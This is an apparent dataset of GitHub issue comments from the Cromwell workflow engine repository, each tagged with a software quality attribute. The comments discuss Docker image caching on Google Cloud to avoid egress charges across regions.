options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:917,Modifiability,config,configuration,917,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:1060,Modifiability,config,configuration,1060,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:1184,Modifiability,config,configured,1184,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:1659,Modifiability,config,configured,1659,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:75,Performance,cache,caches,75,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:225,Performance,cache,cache-support,225,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:1218,Performance,cache,cache,1218,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:1312,Performance,cache,cache,1312,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:1635,Performance,cache,cache,1635,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788:186,Availability,down,download,186,"I feel like overall WDL developers need to have some way to control that docker images be cached within the WDL. Tasks that are not scattered are likely not relevant here, as one single download is unlikely to incur large egress charges. On the other hand for scattered tasks there should be a way for the WDL developer to demand caching, rather than relying on the user to do the right thing. Ideally this should all be handled by Google and container images, when downloaded, should be cached for a pre-determined amount of time. There is something called `mirror.gcr.io` but I did not fully understand how it works and whether it could be part of the solution here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788:466,Availability,down,downloaded,466,"I feel like overall WDL developers need to have some way to control that docker images be cached within the WDL. Tasks that are not scattered are likely not relevant here, as one single download is unlikely to incur large egress charges. On the other hand for scattered tasks there should be a way for the WDL developer to demand caching, rather than relying on the user to do the right thing. Ideally this should all be handled by Google and container images, when downloaded, should be cached for a pre-determined amount of time. There is something called `mirror.gcr.io` but I did not fully understand how it works and whether it could be part of the solution here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788:229,Energy Efficiency,charge,charges,229,"I feel like overall WDL developers need to have some way to control that docker images be cached within the WDL. Tasks that are not scattered are likely not relevant here, as one single download is unlikely to incur large egress charges. On the other hand for scattered tasks there should be a way for the WDL developer to demand caching, rather than relying on the user to do the right thing. Ideally this should all be handled by Google and container images, when downloaded, should be cached for a pre-determined amount of time. There is something called `mirror.gcr.io` but I did not fully understand how it works and whether it could be part of the solution here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788:90,Performance,cache,cached,90,"I feel like overall WDL developers need to have some way to control that docker images be cached within the WDL. Tasks that are not scattered are likely not relevant here, as one single download is unlikely to incur large egress charges. On the other hand for scattered tasks there should be a way for the WDL developer to demand caching, rather than relying on the user to do the right thing. Ideally this should all be handled by Google and container images, when downloaded, should be cached for a pre-determined amount of time. There is something called `mirror.gcr.io` but I did not fully understand how it works and whether it could be part of the solution here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788:488,Performance,cache,cached,488,"I feel like overall WDL developers need to have some way to control that docker images be cached within the WDL. Tasks that are not scattered are likely not relevant here, as one single download is unlikely to incur large egress charges. On the other hand for scattered tasks there should be a way for the WDL developer to demand caching, rather than relying on the user to do the right thing. Ideally this should all be handled by Google and container images, when downloaded, should be cached for a pre-determined amount of time. There is something called `mirror.gcr.io` but I did not fully understand how it works and whether it could be part of the solution here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238:769,Availability,down,download,769,"I've been working on this issue in parallel. My general recommendation would be to **not use GCR for _public_ images** as there is a perpetual risk of egress charges to the image owner. GCR is great for keeping more of your workflow infrastructure inside Google Cloud, but egress charges will be billed to you as the owner of the storage bucket. [Artifact registry seems to have its own set of egress charges](https://cloud.google.com/artifact-registry/pricing), similar to GCS egress charges. Alternatively, services like [quay.io](https://quay.io/plans/) offer unlimited storage and serving of public repos. The consequence of not using GCR is that docker images are now hosted outside of Google Cloud, meaning workflows will need to make an external network call to download the image. The external call will require VMs to have an external IP address. Large parallel workflows will need quota for several external IP addresses, and may run into quota limits. . To alleviate this, workflow runners could be instructed to make a copy of the image into their own GCR. This also has the advantage that the workflow runner can use a repository in the same location as their VMs. Workflow publishers should include instructions on how to upload the image to a private GCR. . How does that sound as a set of guidelines for the community?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238:158,Energy Efficiency,charge,charges,158,"I've been working on this issue in parallel. My general recommendation would be to **not use GCR for _public_ images** as there is a perpetual risk of egress charges to the image owner. GCR is great for keeping more of your workflow infrastructure inside Google Cloud, but egress charges will be billed to you as the owner of the storage bucket. [Artifact registry seems to have its own set of egress charges](https://cloud.google.com/artifact-registry/pricing), similar to GCS egress charges. Alternatively, services like [quay.io](https://quay.io/plans/) offer unlimited storage and serving of public repos. The consequence of not using GCR is that docker images are now hosted outside of Google Cloud, meaning workflows will need to make an external network call to download the image. The external call will require VMs to have an external IP address. Large parallel workflows will need quota for several external IP addresses, and may run into quota limits. . To alleviate this, workflow runners could be instructed to make a copy of the image into their own GCR. This also has the advantage that the workflow runner can use a repository in the same location as their VMs. Workflow publishers should include instructions on how to upload the image to a private GCR. . How does that sound as a set of guidelines for the community?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238:280,Energy Efficiency,charge,charges,280,"I've been working on this issue in parallel. My general recommendation would be to **not use GCR for _public_ images** as there is a perpetual risk of egress charges to the image owner. GCR is great for keeping more of your workflow infrastructure inside Google Cloud, but egress charges will be billed to you as the owner of the storage bucket. [Artifact registry seems to have its own set of egress charges](https://cloud.google.com/artifact-registry/pricing), similar to GCS egress charges. Alternatively, services like [quay.io](https://quay.io/plans/) offer unlimited storage and serving of public repos. The consequence of not using GCR is that docker images are now hosted outside of Google Cloud, meaning workflows will need to make an external network call to download the image. The external call will require VMs to have an external IP address. Large parallel workflows will need quota for several external IP addresses, and may run into quota limits. . To alleviate this, workflow runners could be instructed to make a copy of the image into their own GCR. This also has the advantage that the workflow runner can use a repository in the same location as their VMs. Workflow publishers should include instructions on how to upload the image to a private GCR. . How does that sound as a set of guidelines for the community?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238:401,Energy Efficiency,charge,charges,401,"I've been working on this issue in parallel. My general recommendation would be to **not use GCR for _public_ images** as there is a perpetual risk of egress charges to the image owner. GCR is great for keeping more of your workflow infrastructure inside Google Cloud, but egress charges will be billed to you as the owner of the storage bucket. [Artifact registry seems to have its own set of egress charges](https://cloud.google.com/artifact-registry/pricing), similar to GCS egress charges. Alternatively, services like [quay.io](https://quay.io/plans/) offer unlimited storage and serving of public repos. The consequence of not using GCR is that docker images are now hosted outside of Google Cloud, meaning workflows will need to make an external network call to download the image. The external call will require VMs to have an external IP address. Large parallel workflows will need quota for several external IP addresses, and may run into quota limits. . To alleviate this, workflow runners could be instructed to make a copy of the image into their own GCR. This also has the advantage that the workflow runner can use a repository in the same location as their VMs. Workflow publishers should include instructions on how to upload the image to a private GCR. . How does that sound as a set of guidelines for the community?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238:485,Energy Efficiency,charge,charges,485,"I've been working on this issue in parallel. My general recommendation would be to **not use GCR for _public_ images** as there is a perpetual risk of egress charges to the image owner. GCR is great for keeping more of your workflow infrastructure inside Google Cloud, but egress charges will be billed to you as the owner of the storage bucket. [Artifact registry seems to have its own set of egress charges](https://cloud.google.com/artifact-registry/pricing), similar to GCS egress charges. Alternatively, services like [quay.io](https://quay.io/plans/) offer unlimited storage and serving of public repos. The consequence of not using GCR is that docker images are now hosted outside of Google Cloud, meaning workflows will need to make an external network call to download the image. The external call will require VMs to have an external IP address. Large parallel workflows will need quota for several external IP addresses, and may run into quota limits. . To alleviate this, workflow runners could be instructed to make a copy of the image into their own GCR. This also has the advantage that the workflow runner can use a repository in the same location as their VMs. Workflow publishers should include instructions on how to upload the image to a private GCR. . How does that sound as a set of guidelines for the community?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238:143,Safety,risk,risk,143,"I've been working on this issue in parallel. My general recommendation would be to **not use GCR for _public_ images** as there is a perpetual risk of egress charges to the image owner. GCR is great for keeping more of your workflow infrastructure inside Google Cloud, but egress charges will be billed to you as the owner of the storage bucket. [Artifact registry seems to have its own set of egress charges](https://cloud.google.com/artifact-registry/pricing), similar to GCS egress charges. Alternatively, services like [quay.io](https://quay.io/plans/) offer unlimited storage and serving of public repos. The consequence of not using GCR is that docker images are now hosted outside of Google Cloud, meaning workflows will need to make an external network call to download the image. The external call will require VMs to have an external IP address. Large parallel workflows will need quota for several external IP addresses, and may run into quota limits. . To alleviate this, workflow runners could be instructed to make a copy of the image into their own GCR. This also has the advantage that the workflow runner can use a repository in the same location as their VMs. Workflow publishers should include instructions on how to upload the image to a private GCR. . How does that sound as a set of guidelines for the community?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238:1305,Usability,guid,guidelines,1305,"I've been working on this issue in parallel. My general recommendation would be to **not use GCR for _public_ images** as there is a perpetual risk of egress charges to the image owner. GCR is great for keeping more of your workflow infrastructure inside Google Cloud, but egress charges will be billed to you as the owner of the storage bucket. [Artifact registry seems to have its own set of egress charges](https://cloud.google.com/artifact-registry/pricing), similar to GCS egress charges. Alternatively, services like [quay.io](https://quay.io/plans/) offer unlimited storage and serving of public repos. The consequence of not using GCR is that docker images are now hosted outside of Google Cloud, meaning workflows will need to make an external network call to download the image. The external call will require VMs to have an external IP address. Large parallel workflows will need quota for several external IP addresses, and may run into quota limits. . To alleviate this, workflow runners could be instructed to make a copy of the image into their own GCR. This also has the advantage that the workflow runner can use a repository in the same location as their VMs. Workflow publishers should include instructions on how to upload the image to a private GCR. . How does that sound as a set of guidelines for the community?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902128358:495,Energy Efficiency,charge,charges,495,"It seems to me very cumbersome to ask users to think this through. Currently my WDLs have a variable:; ```; String docker_registry = ""us.gcr.io""; ```; But I have dockers uploaded on each of `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io`. The main issue is that the user has to take initiative to fill that variable with the correct GCR. It would be great if there was some sort of environmental variable that could let the WDL know which docker registry is the closest (and which one has no egress charges).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902128358
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902128358:92,Modifiability,variab,variable,92,"It seems to me very cumbersome to ask users to think this through. Currently my WDLs have a variable:; ```; String docker_registry = ""us.gcr.io""; ```; But I have dockers uploaded on each of `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io`. The main issue is that the user has to take initiative to fill that variable with the correct GCR. It would be great if there was some sort of environmental variable that could let the WDL know which docker registry is the closest (and which one has no egress charges).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902128358
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902128358:303,Modifiability,variab,variable,303,"It seems to me very cumbersome to ask users to think this through. Currently my WDLs have a variable:; ```; String docker_registry = ""us.gcr.io""; ```; But I have dockers uploaded on each of `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io`. The main issue is that the user has to take initiative to fill that variable with the correct GCR. It would be great if there was some sort of environmental variable that could let the WDL know which docker registry is the closest (and which one has no egress charges).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902128358
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902128358:392,Modifiability,variab,variable,392,"It seems to me very cumbersome to ask users to think this through. Currently my WDLs have a variable:; ```; String docker_registry = ""us.gcr.io""; ```; But I have dockers uploaded on each of `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io`. The main issue is that the user has to take initiative to fill that variable with the correct GCR. It would be great if there was some sort of environmental variable that could let the WDL know which docker registry is the closest (and which one has no egress charges).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902128358
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-921150372:318,Modifiability,config,configure,318,I've been looking into a solution that uses [VPC SC settings](https://cloud.google.com/vpc-service-controls) to restrict bucket egress to specific locations. The gist of it is the owner of the docker image puts the container registry in a project that is within a VPC SC perimeter. The docker image owner will need to configure the perimeter such that only VMs from specific ipRanges can access the bucket/docker image. I've put the details and instructions in [this doc](https://docs.google.com/document/d/1SlmleVb9YOmOEwMOFLDzfPq4EX4Sq1WfTcA4gTnnYx0/edit?usp=sharing) that I've currently shared with the Broad.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-921150372
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-921150372:388,Security,access,access,388,I've been looking into a solution that uses [VPC SC settings](https://cloud.google.com/vpc-service-controls) to restrict bucket egress to specific locations. The gist of it is the owner of the docker image puts the container registry in a project that is within a VPC SC perimeter. The docker image owner will need to configure the perimeter such that only VMs from specific ipRanges can access the bucket/docker image. I've put the details and instructions in [this doc](https://docs.google.com/document/d/1SlmleVb9YOmOEwMOFLDzfPq4EX4Sq1WfTcA4gTnnYx0/edit?usp=sharing) that I've currently shared with the Broad.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-921150372
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:16,Availability,echo,echo,16,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:382,Availability,down,downloading,382,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:178,Modifiability,variab,variable,178,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182
